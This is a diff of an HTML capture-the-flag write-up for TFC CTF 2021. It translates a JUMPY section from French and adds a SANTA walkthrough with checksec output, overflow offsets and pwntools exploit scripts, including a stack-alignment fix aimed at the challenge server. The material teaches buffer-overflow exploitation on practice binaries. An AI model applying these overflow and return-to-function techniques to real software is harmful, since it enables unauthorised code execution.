@@ -10,7 +10,8 @@
 <body>
 
 <nav class="navigation" id="mainNav">
-	<nav><h2>TFC CTF 2021</h2></nav>
+	<h2 style="text-align: center;">TFC CTF 2021</h2>
+	<h4 style="text-align: center;">My discord: AMI#7482</h4><br>
 	<a class="navigation__link" href="#1">JUMPY(Pwn)</a>
 	<a class="navigation__link" href="#2">SECRET(Pwn)</a>
 	<a class="navigation__link" href="#3">SANTA(Pwn)</a>
@@ -21,37 +22,33 @@
 </nav>
 
 <div class="page-section hero" id="1">
-	<h2>JUMPY(PWN)</h2>
-	File: <a href="datas/jumpy" style="color:black;">here</a>
+	<h2>JUMPY(Pwn)</h2>
+	File: <a href="datas/jumpy" style="color:#3d3d3d;">here</a>
 	<p>Output of checksek<br><br>
 	$checksec jumpy</p>
-	<img src="datas/checkseckjumpy.png">
-	<pre>
-	└─$ ./jumpy 
-	Jump, jump, jump... where are we going today?
-
-	aaaaaaaaaaaaaaaaaaaa
-	</pre>
+	<img src="datas/checkseckjumpy.png"><br>
+	<img src="datas/ohjumpy.png">
+	
 	<p>C code of Jumpy:</p>
 	<img src="datas/CJumpy.png">
-	<p>Le NX est désactivé donc nous pouvons éxecuter sur la pile.<br>
-	Dans le binaire il n'y a pas de fonction system ou une fonction quelconque pour lire le flag, alors le shellcode.<br>
-	Premièrement il faut le contrôler du RIP.
-	J'ai placé un breakpoint au niveau du ret pour le déboggage.
+	<p>The NX is disabled so we can run on the stack.<br>
+		In the binary there is no system function or any function to read the flag, so the shellcode.<br>
+		First of all, we must control the RIP.<br>
+		I placed a breakpoint at the ret for debugging.<br>
 	</p>
 	<img src="datas/disasmain.png" style="width: 100%;">
-	<p>Avec 0x38 on arrive à atteindre le RIP : "A"*0x38 + "BBBB"</p>
+	<p>With 0x38 we reach the RIP: "A"*0x38 + "BBBB"</p>
 	<img src="datas/jumpRIP.png" style="width: 100%;">
-	<p>Nous pouvons maintenant éxecuteter notre shellcode sur la pile.<br>
-	Minute !<br>
-	Le RIP doit contenir une addresse(l'addresse de notre shellcode) et non le shellcode.<br>
-	J'ai trouvé une fonction np dans le binaire pour nous faciliter la tâche.
+	<p>We can now execute our shellcode on the stack.<br>
+		Wait a minute!<br>
+		The RIP must contain an address (the address of our shellcode) and not the shellcode.<br>
+		I found a np function in the binary to make it easier for us.<br>
 	</p>
 	<img src="datas/disasnp.png">
 	<img src="datas/npC.png">
-	<p>Cette focntion nous permettra d'exécuter notre shellcode.<br>
-	Il suffit de pushé l'addresse de np dans le RIP et notre shellcode après.<br>
-	np address: 0x00401142</p>
+	<p>This function will allow us to execute our shellcode.<br>
+		Just push the np address in the RIP and our shellcode after.<br>
+		np address: 0x00401142</p>
 	<pre>
 	<code class="language-python">
   	from pwn import *
@@ -70,22 +67,85 @@
 	<img src="datas/flag.png">
 </div>
 <div class="page-section" id="2">
-			<h1>SECRET(Pwn)</h1>
+			<h2>SECRET(Pwn)</h2>
+	
 </div>
 <div class="page-section" id="3">
-			<h1>SANTA(Pwn)</h1>
+	<h2>SANTA(Pwn)</h2>
+	File: <a href="datas/santa" style="color:#3d3d3d;">here</a>
+	<p>Output of checksek<br><br>
+	$checksec santa</p>
+	<img src="datas/checksecksanta.png"><br>
+	Let's run the binary.<br><br>
+	<img src="datas/oh.png">
+	
+	<p>C code of santa:</p>
+	<img src="datas/CSanta.png"><br>
+	I found a flag function<br><br>
+	<img src="datas/flagsanta.png"><br><br>
+	The NX is enabled so we can't run anything on the stack, but off the stack.<br>
+	In this case we are going to target the RSP.<br><br>
+	To reach the RSP: "A" * 0x38 + "BBBBBBBB"<br><br>
+	<img src="datas/rspsanta.png"><br><br>
+	Now we can write our exploit to run the flag function.
+	flag function address: 0x00401152<br><br>
+	You can find it in gdb with the command: info functions
+	<pre>
+	<code class="language-python">
+  	from pwn import *
+
+	#sh = remote("server.challenge.ctf.thefewchosen.com",1340)
+	sh = process("./santa")
+	payload = b"A"*(0x38) + p64(0x00401152)
+
+	print(sh.recv().decode())
+	sh.sendline(payload)
+	print(sh.recv().decode())
+	</code>
+	</pre>
+	<p>Output</p>
+	<img src="datas/outsanta.png"><br><br>
+	But there is a concern.<br>
+	When I used it on the remote server it didn't work.<br><br>
+	Output:
+	<pre>
+	<code class="language-python">
+	[*] Got EOF while reading in interactive
+	</code>
+	</pre>
+	Movaps stack alignment.<br><br>
+	If you're segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the x86_64 challenges, then ensure the stack is 16-byte aligned before returning to GLIBC functions such as printf() or system().<a href="https://ropemporium.com/guide.html">Read more....<a><br><br>
+	The solution is to call the ret of the other address one more time before calling the flag() function when designing the overflow stack, so that the rsp address can be reduced by 8.<br><br>
+	I used the return address from init.<br>
+	To find it: objdump santa -M intel --disassemble=_init<br><br>
+	<img src="datas/initsanta.png"><br>
+	New exploit:
+	
+	<pre>
+	<code class="language-python">
+  	from pwn import *
+
+	sh = remote("server.challenge.ctf.thefewchosen.com",1340)
+	#sh = process("./santa")
+	payload = b"A"*(0x38) + p64(0x00401016) + p64(0x00401152)
+
+	print(sh.recv().decode())
+	sh.sendline(payload)
+	print(sh.interactive())
+	</code>
+	</pre>
 </div>
 <div class="page-section" id="4">
-			<h1>HEAPS DON'T LIE(Pwn)</h1>
+			<h2>HEAPS DON'T LIE(Pwn)</h2>
 </div>
 <div class="page-section" id="5">
-			<h1>PIXEL ART(Pwn)</h1>
+			<h2>PIXEL ART(Pwn)</h2>
 </div>
 <div class="page-section" id="6">
-			<h1>SEA LANGUAGE 1(Crypto)</h1>
+			<h2>SEA LANGUAGE 1(Crypto)</h2>
 </div>
 <div class="page-section" id="7">
-			<h1>AM I DOING IT RIGHT?(Crypto)</h1>
+			<h2>AM I DOING IT RIGHT?(Crypto)</h2>
 </div>
 
 </body>
